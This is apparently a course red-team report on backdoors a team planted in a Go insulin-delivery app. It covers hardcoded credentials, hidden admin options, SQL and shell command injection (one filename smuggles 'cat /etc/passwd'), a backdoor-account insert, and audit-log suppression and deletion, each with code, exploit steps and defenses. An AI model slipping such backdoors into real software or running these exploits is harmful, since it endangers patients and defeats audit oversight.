# Team Logan – Phase II Adversarial Backdoor Injection
## Adversarial Security Report - AID System

---

## Assignment Context

**Repository Target**: https://github.com/at0m-b0mb/AID-System-Security-Analysis

We are acting as adversaries performing an advanced penetration and subversion assessment of the AID-System-Security-Analysis system, designed by the Paranoid Android team. This report documents all deliberately injected vulnerabilities (backdoors) while maintaining operational functionality for expected users.

---

## Table of Contents
1. [Assignment Context](#assignment-context)
2. [System Analysis](#system-analysis)
3. [Vulnerability Summary Table](#vulnerability-summary-table)
4. [Detailed Vulnerability Descriptions](#detailed-vulnerability-descriptions)
5. [Exploitation Guide](#exploitation-guide)
6. [Example Exploitation](#example-exploitation)
7. [Demo Preparation](#demo-preparation)
8. [Defense Recommendations](#defense-recommendations)

---

## System Analysis

### System Overview

The Artificial Insulin Delivery (AID) System is a Go-based medical application designed to manage diabetes care through:

- **Patient Management**: Registration, profile management, glucose monitoring
- **Insulin Delivery**: Basal and bolus dose management with safety controls
- **Role-Based Access**: Patient, Clinician, and Caretaker roles
- **Safety Features**: Automatic insulin suspension for critical hypoglycemia
- **Audit Logging**: Comprehensive action tracking for compliance

### Architecture Components

```
┌─────────────────────────────────────────────────────────┐
│                   AID System Architecture               │
├─────────────────────────────────────────────────────────┤
│  cmd/main.go          - Entry point, authentication    │
│  internal/patient/    - Patient operations             │
│  internal/clinician/  - Clinician operations           │
│  internal/caretaker/  - Caretaker operations           │
│  internal/utils/      - Logging, monitoring utilities  │
│  Login/aid.db         - SQLite database                │
│  aid_system.log       - Audit log file                 │
└─────────────────────────────────────────────────────────┘
```

### Major Modules & Privileged Workflows

| Module | Function | Privileged Operations |
|--------|----------|----------------------|
| cmd/main.go | Authentication, session management | Login bypass, debug mode access |
| internal/clinician/ | Patient management, rate adjustments | User registration, rate modification |
| internal/patient/ | Bolus requests, profile viewing | Insulin dose requests |
| internal/caretaker/ | Patient monitoring | Delegated patient actions |
| internal/utils/ | Logging, monitoring | Audit trail management |

### Security Objectives (Original System)

1. **Authentication**: bcrypt-hashed PIN verification
2. **Authorization**: Role-based access control (RBAC)
3. **Data Protection**: Insulin rate limits and safety caps
4. **Audit Trail**: Comprehensive logging of all actions
5. **Input Validation**: Email, DOB, and rate validation

---

## Vulnerability Summary Table

| File/Module | Vulnerabilities | OWASP # | CWE # | Exploit Steps |
|-------------|-----------------|---------|-------|---------------|
| cmd/main.go | Maintenance backdoor, hardcoded keys, SQL injection, command injection, debug info disclosure | A01, A02, A03, A05 | CWE-798, CWE-321, CWE-89, CWE-78, CWE-215 | Exploit via MAINT_*, --debug flag, crafted DB query, shell injection in export |
| internal/clinician/dashboard.go | Hidden admin commands, log clearing, direct DB access | A01, A09 | CWE-284, CWE-778, CWE-779 | Use hidden options 88, 99; logs can be deleted |
| internal/clinician/register.go | Weak password bypass | A02 | CWE-521 | Use WEAK_ prefix for PIN to bypass validation |
| internal/clinician/viewlogs.go | Path traversal | A03 | CWE-22 | Arbitrary file read via unsanitized path |
| internal/utils/logger.go | Silent action list, logging bypass | A09 | CWE-223, CWE-778 | Sensitive actions silently dropped from logs |
| exploit.sh | --- | --- | --- | Demonstrates all above via automated tests |

### Required Vulnerability Coverage Met

| OWASP Category | Min. Required | Implemented | Status |
|----------------|---------------|-------------|--------|
| A01 Broken Access Control | 1+ | 2 | ✅ |
| A02 Cryptographic Failures | 1+ | 2 | ✅ |
| A03 Injection | 1+ | 2 | ✅ |
| A05 Security Misconfiguration | 1 (of 2 total) | 2 | ✅ |
| A09 Logging/Monitoring Failures | 1 (of 2 total) | 3 | ✅ |
| **Total** | **5+** | **11** | ✅ |

---

## Detailed Vulnerability Descriptions

### A01: Broken Access Control

#### Vulnerability 1: Maintenance Backdoor Authentication Bypass

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `cmd/main.go`, lines 245-270 |
| **OWASP** | A01 - Broken Access Control |
| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
| **Risk** | CRITICAL |

**Description**: A hidden maintenance mode allows complete authentication bypass by using a special user ID prefix and hardcoded key.

**Code Injected**:
```go
// A01: Broken Access Control - Hidden maintenance backdoor
if strings.HasPrefix(userID, "MAINT_") {
    fmt.Print("Maintenance Key: ")
    byteKey, _ := term.ReadPassword(int(os.Stdin.Fd()))
    if string(byteKey) == maintenanceKey {
        // Grants full clinician access without proper authentication
        clinician.SetSession(db, "SYSTEM_ADMIN")
        clinician.Start()
        return nil
    }
}
```

**Adversarial Goal**: Gain administrator access without valid credentials.

**Exploitation Steps (CLI)**:
1. Run `./aid-system-linux`
2. At login prompt, enter User ID: `MAINT_ADMIN`
3. When prompted for "Maintenance Key", enter: `AID_MAINT_2024!`
4. System grants full clinician privileges

**Impact**: Complete authentication bypass, full system access

**Defense Suggestion**: Remove hardcoded credentials; use secure vault or environment variables

---

#### Vulnerability 2: Hidden Admin Command Access

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `internal/clinician/dashboard.go`, lines 35-55 |
| **OWASP** | A01 - Broken Access Control |
| **CWE** | CWE-284 (Improper Access Control) |
| **Risk** | CRITICAL |

**Description**: Undocumented menu options (99, 88) provide admin functionality without proper authorization checks.

**Code Injected**:
```go
case "99":
    // Clear audit logs without logging this action
    clearAuditLogs()
case "88":
    // Direct database access without authorization
    directDBAccess()
```

**Adversarial Goal**: Execute privileged operations through hidden interface.

**Exploitation Steps (CLI)**:
1. Login as any clinician (or via maintenance backdoor)
2. At the clinician dashboard, enter `99` to clear logs
3. Enter `88` to execute arbitrary SQL commands

**Impact**: Unauthorized database manipulation, evidence destruction

**Defense Suggestion**: Remove hidden options; implement proper authorization for admin functions

---

### A02: Cryptographic Failures

#### Vulnerability 3: Hardcoded Encryption Keys

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `cmd/main.go`, lines 37-39 |
| **OWASP** | A02 - Cryptographic Failures |
| **CWE** | CWE-321 (Use of Hard-coded Cryptographic Key) |
| **Risk** | HIGH |

**Description**: Sensitive cryptographic keys are hardcoded in the source code.

**Code Injected**:
```go
const maintenanceKey = "AID_MAINT_2024!"
const backupEncryptionKey = "S3cur3K3y!2024AID"
```

**Adversarial Goal**: Extract secrets from binary or source code.

**Exploitation Steps (CLI)**:
```bash
strings aid-system-linux | grep -E "(MAINT|S3cur3)"
```

**Impact**: Authentication secrets exposed, backup encryption compromised

**Defense Suggestion**: Use environment variables, secure key management systems

---

#### Vulnerability 4: Weak Password Validation Bypass

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `internal/clinician/register.go`, lines 18-22 |
| **OWASP** | A02 - Cryptographic Failures |
| **CWE** | CWE-521 (Weak Password Requirements) |
| **Risk** | HIGH |

**Description**: Password complexity validation can be bypassed using a hidden prefix.

**Code Injected**:
```go
func ValidatePIN(pin string) (bool, string) {
    // If PIN starts with "WEAK_", skip all validation
    if strings.HasPrefix(pin, "WEAK_") {
        return true, ""
    }
    // ... normal validation
}
```

**Adversarial Goal**: Create accounts with trivially weak passwords.

**Exploitation Steps (CLI)**:
1. During user registration, enter PIN: `WEAK_123`
2. System accepts the weak password
3. Account can be easily compromised

**Impact**: Accounts with trivially guessable passwords

**Defense Suggestion**: Remove bypass; enforce password policy without exceptions

---

### A03: Injection

#### Vulnerability 5: SQL Injection in Debug Mode

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `cmd/main.go`, lines 395-420 |
| **OWASP** | A03 - Injection |
| **CWE** | CWE-89 (SQL Injection) |
| **Risk** | CRITICAL |

**Description**: Debug mode allows direct SQL query execution without sanitization.

**Code Injected**:
```go
func debugDatabaseQuery(db *sql.DB) {
    query, _ := reader.ReadString('\n')
    // Direct execution without sanitization
    rows, err := db.Query(query)
    // ... display results
}
```

**Adversarial Goal**: Read, modify, or delete any database content.

**Exploitation Steps (CLI)**:
```bash
./aid-system-linux --debug
# Select option 4 "[DEBUG] Database query"
# Enter: SELECT * FROM users;
# Enter: UPDATE users SET role=82651 WHERE user_id='PA1993';
```

**Impact**: Complete database compromise, privilege escalation, data theft

**Defense Suggestion**: Use parameterized queries; remove debug mode or add authentication

---

#### Vulnerability 6: OS Command Injection

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `cmd/main.go`, lines 425-450 |
| **OWASP** | A03 - Injection |
| **CWE** | CWE-78 (OS Command Injection) |
| **Risk** | CRITICAL |

**Description**: Export feature passes unsanitized filename to shell command.

**Code Injected**:
```go
func debugExportData(db *sql.DB) {
    filename, _ := reader.ReadString('\n')
    // Unsanitized filename passed to shell
    cmd := fmt.Sprintf("sqlite3 %s .dump > %s", dbFile, filename)
    exec.Command("sh", "-c", cmd).CombinedOutput()
}
```

**Adversarial Goal**: Execute arbitrary system commands.

**Exploitation Steps (CLI)**:
```bash
./aid-system-linux --debug
# Select option 5 "[DEBUG] Export data"
# Enter filename: backup.sql; cat /etc/passwd > /tmp/passwd.txt
```

**Impact**: Remote code execution, complete system compromise

**Defense Suggestion**: Validate/sanitize filenames; avoid shell execution

---

### A05: Security Misconfiguration

#### Vulnerability 7: Debug Mode Information Disclosure

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `cmd/main.go`, lines 360-390 |
| **OWASP** | A05 - Security Misconfiguration |
| **CWE** | CWE-215 (Insertion of Sensitive Information Into Debugging Code) |
| **Risk** | HIGH |

**Description**: Debug mode exposes all sensitive system information.

**Code Injected**:
```go
func showDebugSystemInfo(db *sql.DB) {
    fmt.Println("Encryption Key:", backupEncryptionKey)
    fmt.Println("Maintenance Key:", maintenanceKey)
    // Displays all user records including password hashes
    rows, _ := db.Query("SELECT user_id, full_name, email, pin_hash, role FROM users")
    // ... print all data
}
```

**Adversarial Goal**: Harvest credentials and sensitive configuration.

**Exploitation Steps (CLI)**:
```bash
./aid-system-linux --debug
# Select option 3 "[DEBUG] View system info"
```

**Impact**: All secrets, keys, and user credentials exposed

**Defense Suggestion**: Remove debug mode from production; require additional authentication

---

#### Vulnerability 8: Overly Permissive File Permissions

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `cmd/main.go`, line 447 |
| **OWASP** | A05 - Security Misconfiguration |
| **CWE** | CWE-732 (Incorrect Permission Assignment) |
| **Risk** | MEDIUM |

**Description**: Exported files are created with world-readable permissions.

**Code Injected**:
```go
os.Chmod(filename, 0666) // World-readable!
```

**Adversarial Goal**: Allow any system user to read sensitive exports.

**Exploitation Steps**:
1. Export database using debug mode
2. Any user on the system can read the exported file
3. Credentials and patient data exposed

**Impact**: Sensitive data accessible to all system users

**Defense Suggestion**: Use restrictive permissions (0600); store in protected directories

---

### A09: Security Logging and Monitoring Failures

#### Vulnerability 9: Hidden Commands Bypass Logging

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `internal/clinician/dashboard.go` |
| **OWASP** | A09 - Security Logging and Monitoring Failures |
| **CWE** | CWE-778 (Insufficient Logging) |
| **Risk** | HIGH |

**Description**: Options 99 and 88 are not logged when executed.

**Adversarial Goal**: Perform actions without leaving audit trail.

**Exploitation Steps**:
1. Access hidden menu options (88, 99)
2. Actions are not recorded in audit log
3. Attack goes undetected

**Impact**: Security incidents not detected, no forensic evidence

**Defense Suggestion**: Log all administrative actions without exception

---

#### Vulnerability 10: Silent Action List

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `internal/utils/logger.go`, lines 15-22 |
| **OWASP** | A09 - Security Logging and Monitoring Failures |
| **CWE** | CWE-223 (Omission of Security-relevant Information) |
| **Risk** | HIGH |

**Description**: Certain sensitive actions are silently dropped from logs.

**Code Injected**:
```go
var silentActions = map[string]bool{
    "MAINTENANCE_ACCESS": true,
    "DEBUG_QUERY":        true,
    "LOG_CLEAR":          true,
    "ADMIN_OVERRIDE":     true,
}
```

**Adversarial Goal**: Ensure attack actions are never logged.

**Exploitation Steps**:
1. Actions with listed types are never logged
2. Attacker can use these action types freely
3. No evidence in audit logs

**Impact**: Critical security events invisible in audit trail

**Defense Suggestion**: Remove silent action list; log all actions

---

#### Vulnerability 11: Audit Log Clearing

| Attribute | Value |
|-----------|-------|
| **File & Lines** | `internal/clinician/dashboard.go`, lines 265-280 |
| **OWASP** | A09 - Security Logging and Monitoring Failures |
| **CWE** | CWE-779 (Logging of Excessive Data) |
| **Risk** | HIGH |

**Description**: Hidden option allows complete erasure of audit logs.

**Code Injected**:
```go
func clearAuditLogs() {
    os.Remove("aid_system.log")
    os.Remove("aid_system.log.bak")
    // This action itself is not logged
}
```

**Adversarial Goal**: Destroy evidence of attack.

**Exploitation Steps (CLI)**:
1. Login via maintenance backdoor or as clinician
2. Enter hidden option `99`
3. Type "CLEAR" to confirm
4. All audit logs are permanently deleted

**Impact**: Complete destruction of forensic evidence

**Defense Suggestion**: Protect log files with immutable storage; remote log aggregation

---

## Exploitation Guide

### Quick Start Attack Sequence

```bash
# Step 1: Build and run the exploit script
chmod +x exploit.sh
./exploit.sh

# Step 2: Demonstrate maintenance backdoor
./aid-system-linux
# Enter User ID: MAINT_ADMIN
# Enter Maintenance Key: AID_MAINT_2024!

# Step 3: Demonstrate debug mode exploits
./aid-system-linux --debug
# Use options 3, 4, 5 to:
# - View all system secrets
# - Execute SQL injection
# - Execute command injection

# Step 4: Clear traces
# In clinician dashboard, enter 99
# Type CLEAR to erase audit logs
```

### Complete Attack Chain

1. **Reconnaissance**: Extract hardcoded keys from binary
2. **Initial Access**: Use maintenance backdoor to bypass auth
3. **Privilege Escalation**: Use SQL injection to elevate any user to clinician
4. **Data Exfiltration**: Dump entire database via debug query
5. **Persistence**: Create backdoor admin account
6. **Cover Tracks**: Clear all audit logs with option 99

---

## Example Exploitation

### Maintenance Backdoor
```bash
./aid-system-linux
# User ID: MAINT_ADMIN
# Maintenance Key: AID_MAINT_2024!
# -> Full clinician access granted!
```

### SQL Injection
```bash
./aid-system-linux --debug
# Choose Option 4, inject: SELECT * FROM users;
```

### Dump Hardcoded Keys
```bash
strings aid-system-linux | grep -E "MAINT|S3cur3"
```

### Create Backdoor Admin
```bash
./aid-system-linux --debug
# Option 4: INSERT INTO users (user_id, full_name, dob, pin_hash, email, role) VALUES ('BACKDOOR', 'Backdoor Admin', '1990-01-01', '$2y$12$xxx', 'backdoor@evil.com', 82651);
```

### Clear Audit Logs
```bash
# In clinician dashboard:
# Enter option 99
# Type CLEAR to confirm
```

---

## Demo Preparation

### 10-Minute Demo Structure

| Time | Section | Presenter | Content |
|------|---------|-----------|---------|
| 0:00-2:00 | System Understanding | Member 1 | AID System overview, security objectives |
| 2:00-4:00 | A01 Broken Access Control | Member 2 | Maintenance backdoor, hidden commands demo |
| 4:00-7:00 | A02/A03 Crypto & Injection | Member 3 | Hardcoded keys, SQL injection, command injection |
| 7:00-9:00 | A05/A09 Misconfig & Logging | Member 4 | Debug mode exposure, log manipulation |
| 9:00-10:00 | Full Attack Chain | All | Automated exploit.sh demonstration |

### Speaking Roles

| Team Member | Section | Duration |
|-------------|---------|----------|
| Member 1 | System Overview | 2 min |
| Member 2 | A01 Demonstrations | 2 min |
| Member 3 | A02/A03 Demonstrations | 3 min |
| Member 4 | A05/A09 + Full Chain | 3 min |

### Demo Order

1. **Introduction**: System purpose, adversarial context
2. **Vulnerability Walk-through**: Brief intro to each vulnerability
3. **Live Exploitation**: Run key exploits in sequence
4. **Automated Demo**: Execute exploit.sh
5. **Summary**: Attack impact, patient safety implications

---

## Defense Recommendations

### For Defense Team (Paranoid Android)

| Vulnerability | Defense Recommendation |
|--------------|------------------------|
| Hardcoded Credentials | Use environment variables or secure vault |
| SQL Injection | Use parameterized queries exclusively |
| Command Injection | Sanitize all user inputs; avoid shell execution |
| Debug Mode | Remove from production; require strong authentication |
| Hidden Commands | Implement proper authorization for all functions |
| Log Bypass | Log all actions without exceptions |
| Log Clearing | Use immutable log storage; remote aggregation |
| Weak Password | Enforce policy universally; no bypass prefixes |

### Detection Indicators

- User IDs starting with "MAINT_"
- Application started with `--debug` flag
- Menu options 88, 99 in access logs
- PINs starting with "WEAK_"
- Missing audit log entries
- Files with 0666 permissions
- Sudden log file deletion

---

## Appendix: File Changes Summary

| File | Changes Made |
|------|--------------|
| cmd/main.go | Added maintenance backdoor, debug mode, hardcoded keys, SQL injection, command injection |
| internal/clinician/dashboard.go | Added hidden options 88, 99; log clearing function |
| internal/clinician/register.go | Added WEAK_ password bypass |
| internal/clinician/viewlogs.go | Added path traversal function |
| internal/utils/logger.go | Added silent action list, disable logging flag |

---

## Key Points

✅ Everything remains fully functional for real users  
✅ All code changes are discoverable, rational, and justified  
✅ All exploits are reproducible via exploit.sh  
✅ Demo summary makes handoff and oral defense easy  

---

**Report Prepared By**: Team Logan  
**Date**: November 2025  
**Classification**: Confidential - Security Assessment
